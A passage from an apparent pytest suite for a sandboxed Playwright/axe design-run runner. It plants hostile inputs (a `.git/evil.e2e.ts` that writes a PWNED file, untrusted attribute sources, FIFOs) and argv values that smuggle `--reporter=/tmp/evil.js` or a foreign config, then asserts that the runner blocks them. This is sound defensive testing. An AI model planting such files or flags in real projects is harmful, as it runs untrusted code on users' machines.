def test_design_run_gitignore_in_change_paths_staged_differs_from_head(proj, dr):
    """C-3: a staged .gitignore edit (work == index != HEAD) is not a trusted ignore source."""
    proj.write(".gitignore", "node_modules/\ndist/\ntest-results/\nplaywright-report/\nplanted/\n")
    proj.git("add", ".gitignore")
    proj.write("planted/x.js", "x\n")
    o, s = proj.order([RUN_UI], change_paths=[".gitignore"])
    err = blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    assert "planted/ (ignore-source .gitignore)" in err


def test_design_run_tmpdir_inside_project_is_not_used(proj, dr):
    """X4/X15: the private dir is outside the project even when TMPDIR points inside it."""
    inside = proj.root / "tmpin"
    inside.mkdir()
    proj.write(".gitignore", "node_modules/\ndist/\ntest-results/\nplaywright-report/\ntmpin/\n")
    proj.commit("ignore tmpin")
    proj.set_ctl("axe", save_text="{}")
    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s, extra_env={"TMPDIR": str(inside)})
    assert res.code == 0, res.err
    call = proj.stub_calls("axe")[0]
    stage = call["argv"][call["argv"].index("--dir") + 1]
    assert os.path.isabs(stage) and call["argv"][-2:] == ["--save", "r1.axe.json"], call["argv"]
    assert not os.path.realpath(stage).startswith(os.path.realpath(str(proj.root)) + os.sep), stage
    assert list(inside.iterdir()) == []


def test_design_run_artifact_too_large_is_dropped(proj, dr):
    """X15 cap (Chris M16): an artifact over ARTIFACT_CAP is dropped, never copied into outputs/."""
    proj.set_ctl("axe", save_text="y" * 100)
    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s, patches=[(dr, "ARTIFACT_CAP", 50)])
    assert {"name": "r1.axe.json", "reason": "too-large"} in res.run("r1")["dropped"]
    assert not (proj.root / "outputs/t-1/design-run/02-design-run-order-3a-iter1/r1.axe.json").exists()
    o, s = proj.order([RUN_AXE], it=2)                         # mutation: cap off -> copied
    res = proj.run(dr, o, s, patches=[(dr, "ARTIFACT_CAP", 1 << 40)])
    assert (proj.root / "outputs/t-1/design-run/02-design-run-order-3a-iter2/r1.axe.json").exists()


def test_read_artifact_refuses_a_fifo_without_blocking(dr, tmp_path):
    """Sentinel S-4: a FIFO swapped in by an escaped grandchild neither hangs nor gets copied."""
    fifo = tmp_path / "r1.axe.json"
    os.mkfifo(str(fifo))
    started = time.time()
    assert dr._read_artifact(str(fifo)) == (b"", "not-regular")
    assert time.time() - started < 5
    big = tmp_path / "big"
    big.write_bytes(b"z" * (dr.ARTIFACT_CAP + 1))
    assert dr._read_artifact(str(big)) == (b"", "too-large")


# Chris S-4: catalogue values are checked at start; a typo fails closed

CATALOGUE_TYPOS = [
    ("e3", "specs"), ("executes", ["specs"]), ("phases", ["3b"]), ("network", "lan"),
    ("timeout_s", 900), ("stdout_json", "false"), ("runner", "project-binary"), ("params", {"feature": "slg"}),
]


@pytest.mark.parametrize("field,value", CATALOGUE_TYPOS)
def test_catalogue_typo_fails_closed(proj, dr, field, value):
    proj.write("dist/tests/visual/checkout.spec.ts", "// planted under a tracked ignore rule\n")
    cat = json.loads(CATALOGUE.read_text())
    cat["templates"]["ui-capture"][field] = value
    o, s = proj.order([RUN_UI])
    res = proj.run(dr, o, s, patches=[(dr, "_load_catalogue", lambda: (cat, "0" * 64))])
    assert blocked(res, "design-run-schema").strip() == "BLOCKED: design-run-schema catalogue ui-capture " + field
    assert proj.stub_calls("playwright") == [] and res.git_calls == []  # checked before any git call


def test_catalogue_unknown_kind_second_layer(proj, dr):
    """With the start-up validation switched off, E1/E3 still refuse an unknown kind."""
    proj.write("dist/tests/visual/checkout.spec.ts", "// planted\n")
    off = (dr, "_validate_catalogue", lambda cat: None)
    for i, (field, value, token) in enumerate((("e3", "specs", "catalogue e3 specs"),
                                               ("executes", ["specs"], "catalogue executes specs")), 1):
        cat = json.loads(CATALOGUE.read_text())
        cat["templates"]["ui-capture"][field] = value
        o, s = proj.order([RUN_UI], it=i)
        res = proj.run(dr, o, s, patches=[off, (dr, "_load_catalogue", lambda: (cat, "0" * 64))])
        assert token in blocked(res, "design-run-schema")
        assert proj.stub_calls("playwright") == []


def test_catalogue_unknown_template_key_fails_closed(dr):
    cat = json.loads(CATALOGUE.read_text())
    cat["templates"]["axe-scan"]["e3_typo"] = None
    with pytest.raises(dr.Blocked) as exc:
        dr._validate_catalogue(cat)
    assert (exc.value.token, exc.value.detail) == ("design-run-schema", "catalogue axe-scan keys")


# Sentinel S-3: attribute sources outside the committed tree

def test_design_run_attributes_sources_block(proj, dr):
    info = proj.root / ".git/info/attributes"
    info.parent.mkdir(exist_ok=True)
    info.write_text("*.ts ident\n")
    o, s = proj.order([RUN_UI])
    assert blocked(proj.run(dr, o, s), "design-run-untrusted-input").strip() == \
        "BLOCKED: design-run-untrusted-input .git/info/attributes (attributes-source)"
    info.write_text("")                                                # empty: harmless, runs
    o, s = proj.order([RUN_UI], it=2)
    assert proj.run(dr, o, s).code == 0
    info.unlink()
    proj.git("config", "core.attributesFile", str(proj.tmp / "attrs"))
    o, s = proj.order([RUN_UI], it=3)
    assert "git-config core.attributesfile (file:.git/config)" in blocked(proj.run(dr, o, s),
                                                                          "design-run-untrusted-input")
    proj.git("config", "--unset", "core.attributesFile")
    proj.write("dist/keep.js", "tracked under an ignored dir\n")
    proj.git("add", "-f", "dist/keep.js")
    proj.commit("force-add")
    proj.write("dist/.gitattributes", "*.js ident\n")                # untracked, under an ignored dir
    o, s = proj.order([RUN_UI], nn="03")
    assert "dist/.gitattributes (attributes-source)" in blocked(proj.run(dr, o, s), "design-run-untrusted-input")


def test_design_run_modules_not_a_directory_blocks(proj, dr):
    """Sentinel S-4: a non-directory <common>/modules blocks (parity with the ADR)."""
    (proj.root / ".git/modules").write_text("x")
    o, s = proj.order([RUN_PAIR])
    assert blocked(proj.run(dr, o, s), "design-run-untrusted-input").strip() == \
        "BLOCKED: design-run-untrusted-input submodule .git/modules (not-a-directory)"


# ------------------------------------------------------------------------------------------------
# iter 3: Sentinel W12 S2-1..S2-7, Chris W12 N-1..N-4
# ------------------------------------------------------------------------------------------------

# S2-1: a tracked config with a custom testMatch makes Playwright load `.git/evil.e2e.ts`; the
# default-pattern clause never looked at that name, so the `.git` clause blocks it by extension.
# Last column: the E2 `not-ignored` entry git lists for the planted file when it does NOT fold case.
# Git skips a directory whose name equals `.git` under `core.ignorecase` (on at `git init` on a
# case-insensitive filesystem, so macOS; off on Linux): with it on, `tests/.GIT/` is hidden from
# git like the real `.git` and the `.git` clause is the only guard; with it off, git lists it as an
# ordinary untracked directory and E2 blocks it too (U24, CI run 37701653608). Both semantics are
# pinned on every platform through IGNORECASE so neither OS can hide the other's failure.
TESTMATCH_CASES = [
    ("TM-GIT", "export default { testDir: '.', testMatch: '**/*.e2e.ts' };\n", ".git/evil.e2e.ts", RUN_DIFF, None),
    ("TM2-GIT", "export default { testMatch: '**/*.e2e.ts' };\n", ".git/evil.e2e.ts", RUN_DIFF, None),
    ("STATE-GIT", "export default {};\n", "tests/.GIT/helper.ts", RUN_STATE, "tests/.GIT/"),  # case-folded, E3 spec template
]
IGNORECASE = ["ignorecase-true", "ignorecase-false"]


def _custom_testmatch_fixture(proj, config, planted, ignorecase):
    proj.git("config", "core.ignorecase", ignorecase.split("-")[1])
    proj.write("playwright.config.ts", config)
    proj.write("tests/home.e2e.ts", "// tracked custom-pattern test\n")
    proj.commit("custom testMatch")
    proj.write(planted, "require('fs').writeFileSync('PWNED', '1');\n")
    # the fixture premise, checked rather than assumed: git hides the planted path only when it folds case
    listed = proj.git("ls-files", "--others", "--directory").stdout.decode().split()
    return [e for e in listed if planted.startswith(e)]


def _blocked_entries(err):
    return set(err.strip()[len("BLOCKED: design-run-untrusted-input "):].split("; "))


@pytest.mark.parametrize("ignorecase", IGNORECASE)
@pytest.mark.parametrize("name,config,planted,run,e2_entry", TESTMATCH_CASES)
def test_design_run_dot_git_test_extension_blocks_whatever_testmatch(proj, dr, name, config, planted, run,
                                                                    e2_entry, ignorecase):
    e2_listed = _custom_testmatch_fixture(proj, config, planted, ignorecase)
    e2_expected = [e2_entry] if e2_entry and ignorecase == "ignorecase-false" else []
    assert e2_listed == e2_expected
    o, s = proj.order([run])
    err = blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    # the `.git` clause fires on both semantics; E2 adds the untracked directory only where git lists it
    assert _blocked_entries(err) == {"%s (filter-collision)" % planted} | set(e2_expected)
    assert proj.stub_calls("playwright") == [] and not (proj.root / "PWNED").exists()


@pytest.mark.parametrize("ignorecase", IGNORECASE)
@pytest.mark.parametrize("name,config,planted,run,e2_entry", TESTMATCH_CASES)
def test_mutation_dot_git_clause_off_turns_custom_testmatch_red(proj, dr, name, config, planted, run,
                                                               e2_entry, ignorecase):
    e2_listed = _custom_testmatch_fixture(proj, config, planted, ignorecase)
    o, s = proj.order([run])
    res = proj.run(dr, o, s, patches=[(dr, "_git_dir_test_files", lambda files: [])], audit=False)
    if e2_listed:
        # git lists the file, so E2 still blocks it with the clause off: the filter-collision line
        # above came from the clause, and the two guards are independent
        assert _blocked_entries(blocked(res, "design-run-untrusted-input")) == set(e2_listed)
        assert proj.stub_calls("playwright") == [] and not (proj.root / "PWNED").exists()
    else:
        # git hides the file, so the clause is the only guard: without it the run goes through
        assert res.code == 0 and proj.stub_calls("playwright")


def test_git_dir_test_files_unit(dr):
    files = [".git/a.ts", ".GIT/b.MJS", "x/.git/y/c.tsx", ".git/hooks/pre-commit", ".git/config",
             ".git/info/attributes", "x/.gitfoo/d.ts", ".git.ts", "src/e.ts", ".git/f.json"]
    assert dr._git_dir_test_files(files) == [".git/a.ts", ".GIT/b.MJS", "x/.git/y/c.tsx"]


# S2-2: a file planted while the child runs; the git-based post-run diff cannot see `.git/` paths

LATE_CASES = [
    (".git/zz/tests/states/checkout.spec.ts", RUN_STATE),
    (".git/evil.e2e.ts", RUN_DIFF),
    ("dist/tests/states/checkout.spec.ts", RUN_STATE),      # ignored directory: also git-blind
]


@pytest.mark.parametrize("planted,run", LATE_CASES)
def test_design_run_late_plant_is_tree_changed(proj, dr, planted, run):
    proj.write("dist/build.txt", "dist/ exists, so the git diff sees one unchanged collapsed entry\n")
    proj.set_ctl("playwright", create=[planted])
    o, s = proj.order([run, dict(run, id="r2")])
    res = proj.run(dr, o, s)
    assert res.code == 1 and res.report["exit"] == 1
    r1 = res.run("r1")
    assert r1["status"] == "tree-changed" and r1["tree_changed_paths"] == [planted], r1
    assert res.run("r2")["status"] == "skipped" and len(proj.stub_calls("playwright")) == 1


@pytest.mark.parametrize("planted,run", LATE_CASES)
def test_mutation_post_run_rewalk_off_turns_late_plant_red(proj, dr, planted, run):
    proj.write("dist/build.txt", "dist/ exists\n")
    proj.set_ctl("playwright", create=[planted])
    o, s = proj.order([run])
    res = proj.run(dr, o, s, patches=[(dr, "_late_e3_files", lambda *a: [])])
    assert res.code == 0 and res.run("r1")["status"] == "exit"


def test_design_run_late_change_of_a_tracked_spec_is_reported_once(proj, dr):
    """The git diff and the re-walk both see it; the report lists the path once."""
    proj.set_ctl("playwright", create=["tests/visual/checkout.spec.ts"])
    o, s = proj.order([RUN_DIFF])
    r1 = proj.run(dr, o, s).run("r1")
    assert r1["status"] == "tree-changed" and r1["tree_changed_paths"] == ["tests/visual/checkout.spec.ts"]


def test_design_run_post_run_walk_cap_is_tree_changed(proj, dr):
    """A post-run walk that hits a cap fails closed as tree-changed (the child already ran)."""
    proj.set_ctl("playwright", create=["test-results/%d.txt" % i for i in range(40)])
    o, s = proj.order([RUN_UI])
    entries = sum(len(fs) + len(ds) for _r, ds, fs in os.walk(proj.root) if "node_modules" not in _r)
    res = proj.run(dr, o, s, patches=[(dr, "WALK_MAX_ENTRIES", entries + 20)])
    r1 = res.run("r1")
    assert res.code == 1 and r1["status"] == "tree-changed", r1
    assert r1["reason"].startswith("design-run-untrusted-input tree-walk (entry cap"), r1


# S2-3 / N-1: the budget is read immediately before the child starts

def _slow_per_run_check(dr, seconds):
    real, calls = dr._tree_check, []

    def slow(ctx, plan, created=()):
        calls.append(1)
        if len(calls) > 1:                 # the first call is step 7; later calls are per run
            time.sleep(seconds)
        return real(ctx, plan, created)
    return slow


def test_run_budget_is_read_after_the_prerun_checks(proj, dr):
    """Chris P5: the per-run checks take 3 s of a 9 s budget; the child gets what is left minus
    the post-run reserve, not the budget read before the checks. 9 s leaves 4 s for the other
    pre-run work under load (Chris C24b-2: 6 s left 1.0 s and flaked once in 25 loaded suites)."""
    proj.set_ctl("axe", sleep=30)
    o, s = proj.order([RUN_AXE])
    started = time.time()
    res = proj.run(dr, o, s, patches=[(dr, "RUN_BUDGET_S", 9), (dr, "POST_RUN_RESERVE_S", 1.0),
                                      (dr, "_tree_check", _slow_per_run_check(dr, 3))])
    took = time.time() - started
    r1 = res.run("r1")
    assert r1["status"] == "timeout" and r1["timeout_s"] <= 9 - 3 - 1 + 0.5, r1
    assert took < 9 + 1, took


def test_run_budget_exhausted_by_the_prerun_checks_skips_the_run(proj, dr):
    proj.set_ctl("axe", sleep=30)
    o, s = proj.order([RUN_AXE, dict(RUN_AXE, id="r2")])
    res = proj.run(dr, o, s, patches=[(dr, "RUN_BUDGET_S", 6), (dr, "POST_RUN_RESERVE_S", 1.0),
                                      (dr, "_tree_check", _slow_per_run_check(dr, 5))])
    assert res.code == 1 and proj.stub_calls("axe") == [] and res.spawns == []
    assert [(r["status"], r["reason"]) for r in res.report["runs"]] == [("skipped", "budget-exhausted")] * 2
    # Chris R3-2: a run skipped after its checks carries no argv (it was never about to run)
    assert "argv" not in res.run("r1") and "executable" not in res.run("r1")


# S2-4: attr.tree is a project-controlled attribute source

def test_local_attr_tree_blocks(proj, dr):
    proj.git("config", "attr.tree", "HEAD")
    o, s = proj.order([RUN_PAIR])
    blocked(proj.run(dr, o, s), "design-run-untrusted-input git-config attr.tree (file:.git/config)")


# S2-5 / N-4: signals during cleanup

def test_signal_handler_masks_later_deliveries(dr):
    ctx = dr.Ctx()
    old = dr._install_signal_handlers(ctx)
    try:
        with pytest.raises(SystemExit):
            os.kill(os.getpid(), signal.SIGTERM)
            time.sleep(2)
        os.kill(os.getpid(), signal.SIGTERM)                # ignored, not a second SystemExit
        os.kill(os.getpid(), signal.SIGHUP)
        time.sleep(0.2)
        masked = [signal.getsignal(s) for s in (signal.SIGTERM, signal.SIGHUP, signal.SIGINT)]
    finally:
        dr._restore_signal_handlers(old)
    assert masked == [signal.SIG_IGN] * 3 and ctx.signal == "SIGTERM"
    assert signal.getsignal(signal.SIGINT) is signal.default_int_handler


def test_signal_during_private_dir_removal_is_ignored(proj, dr):
    """N-4 window 1: the handlers stay masked until the private dir is gone."""
    import types
    real_rmtree = shutil.rmtree

    def rmtree_after_signal(path, *a, **k):
        os.kill(os.getpid(), signal.SIGTERM)
        time.sleep(0.2)
        return real_rmtree(path, *a, **k)

    fake = types.SimpleNamespace(which=shutil.which, rmtree=rmtree_after_signal)
    o, s = proj.order([RUN_PAIR])
    res = proj.run(dr, o, s, patches=[(dr, "shutil", fake)])
    assert res.code == 0 and res.report["exit"] == 0
    assert list((proj.tmp / "runner-tmp").iterdir()) == []


def test_signal_after_the_report_keeps_the_report_exit_code(proj, dr):
    """N-4 window 2: a signal right after the report is written cannot turn exit 0 into 4."""
    real = dr._write_report

    def write_then_signal(ctx, code, error=None):
        out = real(ctx, code, error)
        os.kill(os.getpid(), signal.SIGTERM)
        time.sleep(0.2)
        return out

    o, s = proj.order([RUN_PAIR])
    res = proj.run(dr, o, s, patches=[(dr, "_write_report", write_then_signal)])
    assert res.code == 0 and res.report["exit"] == 0 and res.report["error"] is None


def test_runner_double_sigterm_still_cleans_up(proj):
    p, child = _start_and_wait_for_child(proj, [PY, "-I", str(RUNNER)])
    os.kill(p.pid, signal.SIGTERM)
    os.kill(p.pid, signal.SIGTERM)
    out, err = p.communicate(timeout=30)
    assert p.returncode == 1, err
    assert _wait_gone(child), "child survived the runner"
    assert list((proj.tmp / "runner-tmp").iterdir()) == []
    rep = json.loads((proj.root / "outputs/t-1/design-run/02-design-run-order-3a-iter1.report.json").read_text())
    assert rep["exit"] == 1 and rep["error"] == "terminated (SIGTERM)"
    assert rep["runs"][0]["status"] == "terminated"


# N-3: a child that pre-creates a name the runner writes in the run dir

RUN_DIR = "outputs/t-1/design-run/02-design-run-order-3a-iter1/"


@pytest.mark.parametrize("name,ctl", [
    ("r1.stdout.txt", {}),
    ("r1.axe.json", {"save_text": "{}"}),
])
def test_design_run_child_planted_run_dir_name_is_tree_changed(proj, dr, name, ctl):
    proj.set_ctl("axe", create=[RUN_DIR + name], **ctl)
    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s)
    assert res.code == 1 and res.report["exit"] == 1, (res.code, res.report and res.report["error"])
    r1 = res.run("r1")
    assert (r1["status"], r1["reason"]) == ("tree-changed", "run-dir-preexisting " + name)


# N-2: Chris's probes, max_runs, and the merged report-open Blocked branch

class _TS:
    def __init__(self, root):
        self.root, self.change, self.modified, self.git = root, set(), set(), None

    def tracked(self, p):
        return False

    def flagged(self, p):
        return None


def test_chris_r2_e3_spec_suffix_matches_the_absolute_path(dr, tmp_path, monkeypatch):
    """Playwright matches RegExp(<spec>$) against the absolute path: with the root named `tests`,
    an untracked `visual/checkout.spec.ts` matches `tests/visual/checkout.spec.ts`."""
    root = str(tmp_path / "tests")
    monkeypatch.setattr(dr, "_nested_repo_check", lambda git: [])
    got = dr._e3_check({"e3": "spec"}, "tests/visual/checkout.spec.ts", _TS(root), ["visual/checkout.spec.ts"])
    assert got == [("visual/checkout.spec.ts", "filter-collision")]


def test_chris_r2_grandchild_holding_the_pipe_does_not_stall_the_run(proj, dr):
    """DRAIN_GRACE_S: the leader exits 0 while a backgrounded grandchild keeps stdout open; the run
    ends a couple of seconds later as `exit`, not at its timeout."""
    stub = proj.root / "node_modules/.bin/axe"
    stub.write_text("#!/bin/sh\n(sleep 30) &\necho leader done\nexit 0\n")
    stub.chmod(0o755)
    o, s = proj.order([RUN_AXE])
    t0 = time.time()
    res = proj.run(dr, o, s, patches=[(dr, "RUN_BUDGET_S", 20), (dr, "POST_RUN_RESERVE_S", 1.0)])
    took = time.time() - t0
    r1 = res.run("r1")
    assert r1["status"] == "exit" and r1["exit_code"] == 0, r1
    assert took < 12, took


@pytest.mark.parametrize("value", [9, 0, True, "8"])
def test_catalogue_max_runs_out_of_range_fails_closed(dr, value):
    cat = json.loads(CATALOGUE.read_text())
    cat["max_runs"] = value
    with pytest.raises(dr.Blocked) as exc:
        dr._validate_catalogue(cat)
    assert (exc.value.token, exc.value.detail) == ("design-run-schema", "catalogue max_runs")


def test_blocked_with_report_open_and_no_child_writes_the_report(proj, dr):
    """The former `_undo_outputs` path: a Blocked after step 8 with no child started is recorded
    in the report with exit 1 (never exit 3 once outputs exist)."""
    def execute_blocked(ctx, plan):
        raise dr.Blocked("design-run-untrusted-input", "x (filter-collision)")

    o, s = proj.order([RUN_PAIR])
    res = proj.run(dr, o, s, patches=[(dr, "_execute", execute_blocked)])
    assert res.code == 1 and res.spawns == [] and res.err == ""
    assert res.report["exit"] == 1 and res.report["error"] == "BLOCKED: design-run-untrusted-input x (filter-collision)"


# S2-7: catalogue values that would switch a required check off

CATALOGUE_SWITCH_OFF = [
    ("state-tests", "e3", None, "e3"),
    ("visual-diff", "e3", None, "e3"),
    ("ui-capture", "executes", [], "executes"),
    ("visual-diff", "executes", ["playwright-config", "package-json", "lockfiles"], "executes"),
    ("axe-scan", "executes", [], "executes"),
    ("ui-screenshot", "executes", ["package-json", "lockfiles"], "executes"),
    ("ui-capture", "params", {"feature": "text"}, "params"),
    ("axe-scan", "params", {"url": "text"}, "params"),
    ("contrast-check", "params", {"ds": "text"}, "params"),
    ("ui-capture", "spec", "/abs/tests/visual/{feature}.spec.ts", "spec"),
    ("ui-capture", "spec", "tests/../x/{feature}.spec.ts", "spec"),
    ("axe-scan", "artifacts", ["../../x"], "artifacts"),
    ("axe-scan", "artifacts", ["<run-id>/../x.json"], "artifacts"),
    ("ui-capture", "writes", ["../outside/**"], "writes"),
    ("ui-capture", "writes", ["/abs/**"], "writes"),
    ("ui-screenshot", "network", "loopback", "network"),
    ("design-search", "script", "../search.py", "script"),
    ("axe-scan", "bin", "../axe", "bin"),
]


@pytest.mark.parametrize("template,field,value,expect", CATALOGUE_SWITCH_OFF)
def test_catalogue_value_switching_a_check_off_fails_closed(dr, template, field, value, expect):
    cat = json.loads(CATALOGUE.read_text())
    cat["templates"][template][field] = value
    with pytest.raises(dr.Blocked) as exc:
        dr._validate_catalogue(cat)
    assert (exc.value.token, exc.value.detail) == ("design-run-schema", "catalogue %s %s" % (template, expect))


@pytest.mark.parametrize("value", [True, 1.0, "1"])
def test_catalogue_schema_must_be_the_integer_1(dr, value):
    cat = json.loads(CATALOGUE.read_text())
    cat["schema"] = value
    with pytest.raises(dr.Blocked) as exc:
        dr._validate_catalogue(cat)
    assert exc.value.detail == "catalogue top-level"


def test_catalogue_switch_off_reaches_no_git_call(proj, dr):
    """The runtime path: `e3: null` on state-tests blocks before any git call or child."""
    proj.write("dist/tests/states/checkout.spec.ts", "// planted\n")
    cat = json.loads(CATALOGUE.read_text())
    cat["templates"]["state-tests"]["e3"] = None
    o, s = proj.order([RUN_STATE])
    res = proj.run(dr, o, s, patches=[(dr, "_load_catalogue", lambda: (cat, "0" * 64))])
    assert blocked(res, "design-run-schema").strip() == "BLOCKED: design-run-schema catalogue state-tests e3"
    assert res.git_calls == [] and proj.stub_calls("playwright") == []


# ------------------------------------------------------------------------------------------------
# v7u.4.13: W12 follow-ups (Sentinel r3 S3-1..S3-5, Chris r3 R3-1..R3-3, Bella F-1/F-10, erratum-2 §3)
# ------------------------------------------------------------------------------------------------

@pytest.fixture
def default_sigint():
    """SIGINT at Python's default, whatever the shell that started pytest left it at."""
    old = signal.signal(signal.SIGINT, signal.default_int_handler)
    yield
    signal.signal(signal.SIGINT, old)


# S3-2: the pre-run snapshot and walk signature are taken before the pre-run check

@pytest.mark.parametrize("tracked", ["playwright.config.ts", "package-lock.json"])
def test_design_run_edit_after_the_prerun_check_is_tree_changed(proj, dr, tracked):
    """Sentinel window2.py: a concurrent edit of a tracked non-spec input after the check (here at
    argv build) ran unreported when the snapshot came after the check."""
    real = dr._build_argv

    def edit_then_build(item, ctx):
        with open(os.path.join(ctx.root, tracked), "a") as fh:
            fh.write("// concurrent edit\n")
        return real(item, ctx)

    o, s = proj.order([RUN_UI])
    res = proj.run(dr, o, s, patches=[(dr, "_build_argv", edit_then_build)])
    r1 = res.run("r1")
    assert res.code == 1 and r1["status"] == "tree-changed", r1
    assert r1["tree_changed_paths"] == [tracked], r1


# R3-2 / S3-4: the early budget check keeps the post-run reserve back

def test_run_budget_early_check_keeps_the_reserve(proj, dr):
    """Budget 10 s against the 30 s reserve: the run is skipped before its per-run checks."""
    slow = _slow_per_run_check(dr, 0)
    calls = []

    def counting(ctx, plan, created=()):
        calls.append(1)
        return slow(ctx, plan, created)

    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s, patches=[(dr, "RUN_BUDGET_S", 10), (dr, "_tree_check", counting)])
    r1 = res.run("r1")
    assert res.code == 1 and (r1["status"], r1["reason"]) == ("skipped", "budget-exhausted"), r1
    assert calls == [1] and res.spawns == [] and "argv" not in r1   # step 7 only


# S3-3: SIGINT is in the masked-handler set

def test_sigint_is_in_the_masked_handler_set(dr, default_sigint):
    ctx = dr.Ctx()
    old = dr._install_signal_handlers(ctx)
    try:
        with pytest.raises((SystemExit, KeyboardInterrupt)) as exc:
            os.kill(os.getpid(), signal.SIGINT)
            time.sleep(2)
        masked = [signal.getsignal(s) for s in (signal.SIGTERM, signal.SIGHUP, signal.SIGINT)]
        if masked[2] == signal.SIG_IGN:   # never send a second SIGINT that would abort pytest
            os.kill(os.getpid(), signal.SIGINT)             # ignored, not a second exception
            time.sleep(0.2)
    finally:
        dr._restore_signal_handlers(old)
    assert exc.type is SystemExit and ctx.signal == "SIGINT"
    assert masked == [signal.SIG_IGN] * 3
    assert signal.getsignal(signal.SIGINT) is signal.default_int_handler


def test_sigint_ignored_at_start_stays_ignored(dr):
    before = signal.signal(signal.SIGINT, signal.SIG_IGN)
    try:
        old = dr._install_signal_handlers(dr.Ctx())
        now = signal.getsignal(signal.SIGINT)
        dr._restore_signal_handlers(old)
    finally:
        signal.signal(signal.SIGINT, before)
    assert now == signal.SIG_IGN and signal.SIGINT not in old


def test_second_sigint_during_the_group_kill_is_masked(proj, dr, default_sigint):
    """Sentinel S3-3 window: a SIGINT that lands in _spawn_child's `finally` before the group kill
    must not skip it."""
    flag = proj.tmp / "saved.flag"
    proj.set_ctl("axe", save_text="{}", sleep=20, saved_flag=str(flag))
    real_pump, real_kill = dr._pump, dr._kill_group

    def pump_then_sigint(proc, pairs, timeout):
        deadline = time.time() + 30
        while not flag.exists() and time.time() < deadline:
            time.sleep(0.05)
        os.kill(os.getpid(), signal.SIGINT)
        time.sleep(2)
        return real_pump(proc, pairs, timeout)

    def sigint_then_kill(proc):
        os.kill(os.getpid(), signal.SIGINT)
        time.sleep(0.2)
        return real_kill(proc)

    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s, patches=[(dr, "_pump", pump_then_sigint), (dr, "_kill_group", sigint_then_kill)])
    child = int(flag.read_text())
    try:
        assert res.code == 1 and res.report["error"] == "terminated (SIGINT)", (res.code, res.err)
        assert _wait_gone(child, 5), "the second SIGINT skipped the group kill"
    finally:
        try:
            os.kill(child, signal.SIGKILL)
        except ProcessLookupError:
            pass


# R3-1: a signal inside main's `except Blocked` / `except Exception` clause

def _blocked_that_signals(dr):
    class SignalBlocked(dr.Blocked):
        """Reading `detail` (main's first statement in `except Blocked`) delivers SIGTERM."""
        fired = False

        @property
        def detail(self):
            if not SignalBlocked.fired:
                SignalBlocked.fired = True
                os.kill(os.getpid(), signal.SIGTERM)
                time.sleep(0.5)
            return self._detail

        @detail.setter
        def detail(self, value):
            self._detail = value
    return SignalBlocked


def _raise(exc):
    def fn(*_a, **_k):
        raise exc
    return fn


def test_signal_inside_except_blocked_before_the_report_is_exit_4(proj, dr):
    """Chris P1: Blocked from _prepare (no report yet); the signal must not escape main."""
    exc = _blocked_that_signals(dr)("design-run-untrusted-input", "x")
    o, s = proj.order([RUN_PAIR])
    res = proj.run(dr, o, s, patches=[(dr, "_prepare", _raise(exc))])
    assert res.code == 4 and res.report is None, (res.code, res.err)
    assert res.err == "design-run: terminated (SIGTERM)\n", res.err
    assert not list((proj.root / "outputs").rglob("*.report.json"))


def test_signal_inside_except_blocked_with_the_report_open_writes_it(proj, dr):
    """Chris P2: Blocked from _execute (report open): no 0-byte report, no SystemExit escape."""
    exc = _blocked_that_signals(dr)("design-run-untrusted-input", "x (filter-collision)")
    o, s = proj.order([RUN_PAIR])
    res = proj.run(dr, o, s, patches=[(dr, "_execute", _raise(exc))])
    assert res.code == 1 and res.report["exit"] == 1, (res.code, res.err)
    assert res.report["error"] == "terminated (SIGTERM)"


def test_signal_inside_except_exception_with_the_report_open_writes_it(proj, dr):
    import types

    def format_exc_then_signal():
        os.kill(os.getpid(), signal.SIGTERM)
        time.sleep(0.5)
        return "tb"

    o, s = proj.order([RUN_PAIR])
    res = proj.run(dr, o, s, patches=[(dr, "_execute", _raise(RuntimeError("boom"))),
                                      (dr, "traceback", types.SimpleNamespace(format_exc=format_exc_then_signal))])
    assert res.code == 1 and res.report["exit"] == 1, (res.code, res.err)
    assert res.report["error"] == "terminated (SIGTERM)"


# S3-5: catalogue values that are valid but narrow a check

CATALOGUE_NARROWING = [
    ("ui-capture", "argv", ["test", "--update-snapshots=none"], "e3"),         # e3 spec without the filter
    ("state-tests", "argv", ["test"], "e3"),
    ("visual-diff", "argv", ["test", "<spec-filter>", "--grep", "visual regression"], "e3"),
    ("ui-capture", "writes", ["tests/**"], "writes"),
    ("ui-capture", "writes", [".git/**"], "writes"),
    ("ui-capture", "writes", ["src/**"], "writes"),
    ("ui-capture", "writes", ["{feature}/**"], "writes"),
    ("ui-capture", "writes", ["node_modules/**"], "writes"),
    ("baseline-capture", "writes", ["tests/visual/other.spec.ts-snapshots/**"], "writes"),
    ("ui-capture", "argv", ["test", "<spec-filter>", "--config", "/tmp/x.ts"], "argv"),
    ("ui-capture", "argv", ["test", "<spec-filter>", "--config=/tmp/x.ts"], "argv"),
    ("ui-capture", "argv", ["test", "<spec-filter>", "-c", "/tmp/x.ts"], "argv"),
    ("ui-capture", "argv", ["--config=/tmp/x.ts", "test", "<spec-filter>"], "argv"),  # leading global flag
    ("ui-screenshot", "argv", ["show-report"], "argv"),
    # S13-2: the argv rule is an allowlist (Playwright 1.63 loads each of these)
    ("ui-capture", "argv", ["test", "<spec-filter>", "-c/tmp/x.ts"], "argv"),
    ("ui-capture", "argv", ["test", "<spec-filter>", "-xc/tmp/x.ts"], "argv"),
    ("ui-capture", "argv", ["test", "<spec-filter>", "-xc", "/tmp/x.ts"], "argv"),
    ("ui-capture", "argv", ["test", "<spec-filter>", "-c=/tmp/x.ts"], "argv"),
    ("ui-capture", "argv", ["test", "<spec-filter>", "--reporter=/tmp/evil.js"], "argv"),
    ("ui-capture", "argv", ["test", "<spec-filter>", "--reporter", "/tmp/evil.js"], "argv"),
    ("ui-capture", "argv", ["test", "<spec-filter>", "--reporter={feature}"], "argv"),
    ("ui-capture", "argv", ["test", "<spec-filter>", "--tsconfig=/tmp/t.json"], "argv"),
    ("ui-capture", "argv", ["test", "<spec-filter>", "--test-list=/tmp/l.txt"], "argv"),
    ("ui-capture", "argv", ["test", "<spec-filter>", "--update-snapshots=all"], "argv"),
    ("state-tests", "argv", ["test", "<spec-filter>", "<spec-filter>"], "argv"),
